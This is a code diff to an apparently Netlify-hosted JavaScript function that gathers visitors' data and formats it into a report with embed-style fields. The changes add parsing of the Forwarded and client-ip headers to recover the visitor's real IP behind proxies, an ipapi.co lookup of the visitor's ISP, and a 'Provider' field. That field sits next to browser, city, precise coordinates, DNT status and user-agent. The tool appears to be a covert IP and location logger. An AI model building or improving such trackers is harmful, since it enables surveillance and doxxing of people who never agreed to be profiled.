@@ -17,9 +17,28 @@ export async function handler(event) {
   }
   const rawXff = headers["x-forwarded-for"] || "";
   const xffList = rawXff.split(",").map(s => s.trim()).filter(Boolean);
+  const rawFwd = headers["forwarded"] || "";
+  const fwdList = [];
+  if (rawFwd) {
+    rawFwd.split(",").forEach(part => {
+      const m = part.match(/for=([^;]+)/i);
+      if (m) {
+        let v = m[1].trim().replace(/^"|"$/g, "");
+        if (v.startsWith("[")) {
+          v = v.replace(/^\[|\]$/g, "");
+        } else if (v.includes('.') && v.includes(':')) {
+          const idx = v.lastIndexOf(':');
+          if (idx > 0) v = v.slice(0, idx);
+        }
+        if (v) fwdList.push(v);
+      }
+    });
+  }
   const candidates = [
     headers["x-nf-client-connection-ip"],
     headers["x-real-ip"],
+    headers["client-ip"],
+    ...fwdList,
     ...xffList
   ].filter(Boolean);
 
@@ -65,7 +84,7 @@ export async function handler(event) {
   }
 
   // 2) Geo: prefer Netlify geo header; fallback to ipapi.co
-  let country = ""; let countryCode = ""; let city = "";
+  let country = ""; let countryCode = ""; let city = ""; let provider = "";
   try {
     const geoRaw = headers["x-nf-geo"];
     if (geoRaw) {
@@ -76,7 +95,7 @@ export async function handler(event) {
     }
   } catch (_) {}
 
-  if (!countryCode && ip) {
+  if ((!countryCode || !provider) && ip) {
     try {
       const r = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, { headers: { "User-Agent": "netlify-func" } });
       if (r.ok) {
@@ -84,6 +103,7 @@ export async function handler(event) {
         country = j.country_name || country;
         countryCode = (j.country || countryCode || "").toUpperCase();
         city = j.city || city;
+        provider = (j.org || j.asn_org || j.asn || (j.company && (j.company.name || j.company)) || j.isp || provider || "").toString();
       }
     } catch (_) {}
   }
@@ -109,6 +129,7 @@ export async function handler(event) {
       { name: "Browser", value: browser || "-", inline: true },
       { name: "Country", value: country || countryCode || "-", inline: true },
       { name: "City", value: city || "-", inline: true },
+      { name: "Provider", value: provider || "-", inline: true },
       { name: "Coords", value: (lat != null && lon != null) ? `${lat.toFixed(5)}, ${lon.toFixed(5)}${accuracy!=null?` (±${Math.round(accuracy)}m)`:''}` : "-", inline: true },
       { name: "DNT", value: dnt, inline: true },
       { name: "User-Agent", value: ua ? (ua.length > 256 ? ua.slice(0, 253) + "..." : ua) : "-", inline: false },
